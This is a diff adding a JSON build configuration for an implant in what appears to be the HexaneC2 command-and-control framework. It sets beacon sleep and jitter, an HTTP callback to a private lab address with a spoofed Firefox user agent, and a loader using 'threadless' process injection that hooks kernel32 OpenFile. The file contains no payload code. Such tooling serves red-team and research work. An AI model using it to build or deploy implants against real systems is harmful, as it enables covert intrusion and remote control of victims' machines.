@@ -1,0 +1,57 @@
+{
+	"config": {
+		"architecture": "amd64",
+		"debug": false,
+		"encrypt": false,
+		"hostname": "LENOVO-WRKSTN-L",
+		"config_size": 1024,
+		"sleeptime": 3,
+		"jitter": 10
+	},
+
+	"network": {
+		"type": "http",
+		"options": {
+			"useragent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+			"address": "192.168.10.166",
+			"port": 80,
+
+			"endpoints": [
+				"/endpoint0","/endpoint1", "/endpoint2", "/endpoint3", "/endpoint4",
+				"/endpoint5", "/endpoint6", "/endpoint7", "/endpoint8", "/endpoint9"
+			]
+		}
+	},
+
+	"builder": {
+		"output_name": "windows_work",
+		"root_directory": "/home/lemur/Github/HexaneC2/core",
+		"linker_script": "implant.ld",
+
+		"loaded_modules": [
+			"crypt32", "winhttp", "advapi32", "iphlpapi", "kernelbase", "mscoree"
+		]
+	},
+
+	"loader": {
+		"root_directory": "/home/lemur/Github/HexaneC2/loader",
+		"linker_script": "loader.ld",
+		"rsrc_script": "resource.rc",
+
+		"sources": [
+			"dllmain.cpp", "resource.cpp"
+		],
+
+		"injection": {
+			"type": "threadless",
+			"options": {
+				"target_process": "blobrunner64.exe",
+				"target_module":"kernel32.dll",
+				"target_function":"OpenFile",
+				"loader_assembly": "/home/lemur/Github/HexaneC2/inject/threadless/loader.asm",
+				"execute_object":"/home/lemur/Github/HexaneC2/inject/threadless/OpenFileExecute.cpp"
+			}
+		}
+	}
+}
+
